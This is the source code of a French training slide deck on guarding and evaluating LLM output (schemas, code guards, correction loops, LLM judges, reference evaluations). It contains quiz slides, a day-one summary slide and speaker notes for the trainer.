      <QuizQ q="Les sorties structurées garantissent…" explain="La forme : un JSON valide conforme au schéma. Pas la justesse des valeurs, d’où les couches suivantes du harnais.">
        <QOpt>que les valeurs extraites sont justes</QOpt>
        <QOpt>l’absence d’hallucination</QOpt>
        <QOpt>que le code généré compile</QOpt>
        <QOpt ok>un JSON conforme au schéma fourni</QOpt>
      </QuizQ>
      <QuizQ q="Dans la boucle générer → vérifier → corriger, on renvoie au modèle…" explain="Les erreurs exactes : règle, fichier, ligne, correction attendue. « Recommence » ne donne aucune information ; 2 000 lignes de log noient l’essentiel.">
        <QOpt ok>les erreurs précises : règle, fichier, ligne, correction attendue</QOpt>
        <QOpt>« c’est faux, recommence »</QOpt>
        <QOpt>tout le journal d’exécution, sans tri</QOpt>
        <QOpt>rien : on régénère avec un autre modèle</QOpt>
      </QuizQ>
      <QuizQ q="Votre prompt commence par un identifiant de requête unique. Conséquence ?" explain="Le cache repose sur un préfixe identique : un identifiant unique en tête rend chaque préfixe différent, le cache ne sert jamais.">
        <QOpt>les réponses sont plus précises</QOpt>
        <QOpt>aucune</QOpt>
        <QOpt ok>le prompt caching ne sert plus jamais</QOpt>
        <QOpt>une erreur 400</QOpt>
      </QuizQ>
      <QuizQ q="Avant de faire confiance à un juge LLM…" explain="On compare ses notes à un jugement humain sur 20 à 30 cas, et on corrige la grille en cas de désaccord.">
        <QOpt ok>on compare ses notes à un jugement humain sur un échantillon</QOpt>
        <QOpt>on vérifie qu’il utilise le modèle le plus cher</QOpt>
        <QOpt>on le laisse remplacer les tests</QOpt>
        <QOpt>on lui donne le même prompt que le générateur</QOpt>
      </QuizQ>
      <QuizQ q="Votre v3 fait 24 / 24 aux tests et 9 / 12 à l’évaluation. Vous…" explain="On analyse les échecs, on corrige une chose, on re-mesure, sans toucher au jeu de référence. Retirer des cas, c’est se mentir.">
        <QOpt>passez en production, les tests sont verts</QOpt>
        <QOpt>retirez les 3 cas ratés du jeu de référence</QOpt>
        <QOpt>mettez l’effort au maximum partout</QOpt>
        <QOpt ok>analysez les 3 échecs, corrigez, re-mesurez sans toucher au jeu</QOpt>
      </QuizQ>
    </QuizSeries>
  </Frame>
);

// ─── Bilan du Jour 1 ────────────────────────────────────────────────────────
const M3_BilanJ1: Page = () => (
  <Frame mod={3} kind="synthese">
    <Title>Bilan du Jour 1</Title>
    <Lede>Ce que vous avez construit aujourd’hui sert de socle à tout le Jour 2.</Lede>
    <div style={{ position: 'absolute', left: 120, top: 262, width: 1680, display: 'grid', gridTemplateColumns: 'repeat(3, minmax(0, 1fr))', gap: 24 }}>
      <Card icon="note" tone="blue" title="Des prompts mesurés" size={23} pad={24} cls={A.in} style={dl(100)}>
        Structurés en XML, avec exemples choisis par le code, versionnés et notés sur les mêmes tests.
      </Card>
      <Card icon="shield" tone="navy" title="Un harnais" size={23} pad={24} cls={A.in} style={dl(200)}>
        Contrat, garde, boucle de correction, juge : l’erreur du modèle ne passe plus en silence.
      </Card>
      <Card icon="chart" tone="violet" title="Une évaluation" size={23} pad={24} cls={A.in} style={dl(300)}>
        12 cas de référence, un rapport, une décision chiffrée sur le prompt et le modèle.
      </Card>
    </div>
    <div style={{ position: 'absolute', left: 120, top: 560, width: 1680, display: 'grid', gridTemplateColumns: 'minmax(0, 1fr) 640px', gap: 30 }}>
      <Callout tone="teal" icon="calendar" title="Demain" size={24} cls={A.in} style={dl(500)}>
        On branche l’extraction sur l’interface web par l’API et le tool use, puis on confie le dépôt à Claude Code, encadré par vos garde-fous.
      </Callout>
      <Callout tone="green" icon="git" title="Avant de partir" size={24} cls={A.in} style={dl(600)}>
        Commitez votre travail. En retard ? <Ic>reprise A2.5</Ic> demain matin.
      </Callout>
    </div>
  </Frame>
);

// @@PAGES-BEGIN
export const __pages = [M3_Section, M3_Familles, M3_Couches, M3_Contrat, M3_Garde, M3_GardeSortie, M3_Boucle, M3_BoucleCode, M3_Juge, M3_Eval, M3_A2, M3_A2Etapes, M3_Pause, M3_A2Eval, M3_Restit, M3_Qcm, M3_BilanJ1];
// @@PAGES-END

// @@NOTES-BEGIN
export const __notes = [
  `⏱ 1 min · SECTION MODULE 3 · J1 12:30

OBJECTIF — Annoncer le cœur du Jour 1 : le harnais autour du modèle.

DIRE — « Ce matin, vous avez amélioré le prompt. Mais même le meilleur prompt se trompe parfois. Cet après-midi, on construit ce qui attrape l’erreur : un contrat, une garde, une boucle de correction, un juge, et une évaluation. »

TRANSITION — « Première distinction, la plus importante. »`,
  `⏱ 2 min · DEUX FAMILLES (1 beat)

OBJECTIF — Distinguer garde-fous probabilistes et déterministes et donner la règle de décision.

DIRE — « À gauche, les garde-fous probabilistes : on prie le modèle de faire attention, par des consignes, des exemples, un juge. Utile, souple, jamais sûr à cent pour cent. À droite, les déterministes : du code qui vérifie, à chaque exécution. »
→ beat 1 « La règle : ce qui doit être vrai à chaque fois passe par du code. Ce qui relève du jugement passe par une consigne, un juge, puis un humain. »

TRANSITION — « Concrètement, un harnais empile cinq couches. »`,
  `⏱ 2 min · CINQ COUCHES (5 beats)

OBJECTIF — Donner le modèle mental des couches successives.

DIRE — « Aucune couche n’est parfaite, mais leurs trous ne s’alignent pas. »
→ beat 1 « Le contrat attrape la forme. »
→ beat 2 « Les contraintes, ce que le modèle n’a pas le droit de faire ou de décider : par exemple, ce n’est pas lui qui fixe la priorité. »
→ beat 3 « La vérification automatique : tests, linter, garde. »
→ beat 4 « Le juge, pour ce qui demande du jugement. »
→ beat 5 « Et l’humain, pour le contexte que personne n’a écrit, et la responsabilité. »

TRANSITION — « Commençons par la couche 1. »`,
  `⏱ 2 min · LE CONTRAT

OBJECTIF — Montrer qu’un seul schéma sert au modèle, au code et aux tests.

DIRE — « Voici le schéma de la demande qualifiée. additionalProperties false : aucun champ inventé. Des énumérations fermées pour le type et la priorité. Ce même fichier va au modèle, par output_config ou --json-schema ; au code, qui valide à la réception ; et aux tests. »

DIRE — « Le piège : une priorité en texte libre. “Très urgent” ne se vérifie pas ; P1 se vérifie. »

TRANSITION — « Couche 3 : la garde. À vous de trouver les défauts. »`,
  `⏱ 3 min · TROUVER LE DÉFAUT (4 beats, vote oral)

OBJECTIF — Faire nommer quatre défauts que la garde doit bloquer.

DIRE — « Quatre extraits générés par un agent pressé. Pour chacun, dites-moi le défaut. »
→ beat 1 « Un jeton en dur : secret-en-dur. »
→ beat 2 « Une requête SQL concaténée : injection SQL. »
→ beat 3 « Un eval sur une donnée du formulaire : exécution de code arbitraire. »
→ beat 4 « Un envoi réseau vers un site non prévu : exfiltration. »

ANIMATION — Laisser chercher avant chaque clic. Ce sont exactement les quatre cas du dossier garde/cas/ de l’Atelier 2.

TRANSITION — « Et ce que la garde répond doit être utile. »`,
  `⏱ 2 min · UNE SORTIE RÉINJECTABLE

OBJECTIF — Montrer qu’un message d’erreur précis est la moitié du garde-fou.

DIRE — « À gauche, un message que je vois souvent : “le code n’est pas conforme”. Inutilisable, pour vous comme pour Claude. À droite : la règle, le fichier, la ligne, et ce qui est attendu. Ce texte, on va le renvoyer tel quel au modèle dans la boucle. »

TRANSITION — « Justement, la boucle. »`,
  `⏱ 2 min · LA BOUCLE (3 beats)

OBJECTIF — Expliquer la boucle générer → vérifier → corriger avec une limite.

DIRE — « On génère, on vérifie. »
→ beat 1 « Si ça échoue, on renvoie les erreurs exactes, et on recommence. »
→ beat 2 « Si tout est vert, on garde le code, et on journalise le nombre de tours. »
→ beat 3 « Si trois tours ne suffisent pas, on s’arrête et on escalade vers un humain. Une boucle sans limite brûle du temps et des jetons. Claude Code fait exactement ça quand un hook lance les tests après chaque modification. »

TRANSITION — « Vous la coderez. Trois trous. »`,
  `⏱ 2 min · BOUCLE À COMPLÉTER (vote oral)

OBJECTIF — Faire compléter oralement la boucle de l’étape A2.3.

DIRE — « La condition de sortie : r.ok. Ce qu’on renvoie : la sortie de la garde et des tests, r.sortie. Et en cas d’échec, ce qu’on donne à l’humain : l’historique des tours. »

ANIMATION — Onglet Java pour les participants Java ; le dépôt contient la même boucle dans les quatre stacks.

TRANSITION — « Couche 4 : le juge. »`,
  `⏱ 2 min · JUGE LLM (2 beats)

OBJECTIF — Présenter le juge LLM, ses biais, et l’obligation de le calibrer.

DIRE — « Pour ce qu’un test ne voit pas, un modèle note selon une grille que vous écrivez, avec une justification qui cite le code, et une sortie structurée. »
→ beat 1 « Ses biais : il aime les réponses longues, la première option, parfois son propre style, et un commentaire habile dans le code peut l’influencer. »
→ beat 2 « Donc on le calibre : vingt à trente cas notés par vous et par lui. En cas de désaccord, on corrige la grille. Et il ne garantit ni la sécurité ni la justesse. »

TRANSITION — « Dernière couche transverse : l’évaluation. »`,
  `⏱ 2 min · ÉVALUER (2 beats)

OBJECTIF — Montrer une évaluation par champ et la manière de lire un écart.

DIRE — « Douze demandes de référence, un score par champ, plusieurs versions côte à côte. »
→ beat 1 « Règle d’or : le jeu est figé. On ne retire jamais un cas raté ; on en ajoute. »
→ beat 2 « Et on lit l’écart : ici, passer à Sonnet rapporte un cas sur la priorité pour un temps doublé, alors que le prompt v3 avait rapporté bien plus. Ces chiffres sont des illustrations : vous mesurerez les vôtres. »

TRANSITION — « À vous. Atelier 2. »`,
  `⏱ 2 min · BRIEF ATELIER 2 (minuteur 90 min)

OBJECTIF — Lancer l’atelier : contrat, garde, boucle, juge.

DIRE — « Quatre étapes. Le contrat et sa validation ; la garde, avec deux règles à écrire ; la boucle de correction ; et le juge. Points d’étape à 13 h 15, 13 h 40 et 14 h 05. »

ANIMATION — Lancer le minuteur. Passer dans les rangs. Blocages fréquents : schéma refusé par --json-schema (vérifier la syntaxe JSON, un seul schéma racine) ; règle de garde trop large qui attrape aussi le code sain (faire tourner garde sur src/ et sur garde/cas/).

TRANSITION — « Le détail des étapes. »`,
  `⏱ 1 min · ÉTAPES DE L’ATELIER 2

OBJECTIF — Montrer les étapes, les durées et les reprises.

DIRE — « Même principe que ce matin : verifier pour savoir si l’étape est réussie, reprise si vous êtes en retard au point d’étape. »

ANIMATION — Laisser cette page ou le brief affichés pendant l’atelier.

TRANSITION — « Pause à 14 h 20. »`,
  `⏱ 10 min · PAUSE · J1 14:20

OBJECTIF — Vraie pause, loin de l’écran.

ANIMATION — Lancer le minuteur.

TRANSITION — « Mini-évaluation, quarante minutes. »`,
  `⏱ 2 min · BRIEF MINI-ÉVALUATION (minuteur 40 min)

OBJECTIF — Lancer la mesure sur les 12 cas de référence.

DIRE — « Quatre mesures : votre prompt v1 et v3, avec Haiku puis Sonnet. Puis vous ouvrez les cas ratés et vous les classez : erreur du prompt, des règles ou du jeu. Vous corrigez une seule chose, vous re-mesurez. Interdiction de retirer un cas. »

ANIMATION — Avec claude-cli, comptez environ 3 à 7 secondes par cas : 12 cas par mesure, 4 mesures, c’est quelques minutes. Si claude -p est bloqué : MOTEUR=simu rejoue des réponses enregistrées (les scores sont alors fixes, l’exercice d’analyse reste valable).

TRANSITION — « On regarde vos rapports. »`,
  `⏱ 8 min · RESTITUTION ATELIER 2 (2–3 volontaires)

OBJECTIF — Tirer les leçons : déterministe pour le certain, mesure pour décider.

DIRE — « Deux ou trois volontaires : votre rapport, et une règle de garde qui vous a surpris. »

ANIMATION — Insister sur la demande n° 11 : ceux qui l’ont laissée passer sans règle métier comprendront l’Atelier 3.

TRANSITION — « Vérifions ce qui reste de la journée : QCM. »`,
  `⏱ 6 min · QCM DU JOUR 1 (vote oral)

OBJECTIF — Ancrer les notions du jour.

DIRE — « Six questions, vote à voix haute, je clique la réponse majoritaire. »

ANIMATION — Une minute par question. Expliquer brièvement les erreurs majoritaires.

TRANSITION — « Le bilan. »`,
  `⏱ 4 min · BILAN DU JOUR 1

OBJECTIF — Récapituler et annoncer le Jour 2.

DIRE — « Aujourd’hui : des prompts mesurés, un harnais, une évaluation. Demain, on branche tout ça sur l’interface web par l’API et le tool use, puis on confie le dépôt à Claude Code, encadré par vos garde-fous. Commitez votre travail ; si vous êtes en retard, reprise A2.5 demain matin. Merci et à demain. »

TRANSITION — Fin du Jour 1.`,
];
// @@NOTES-END
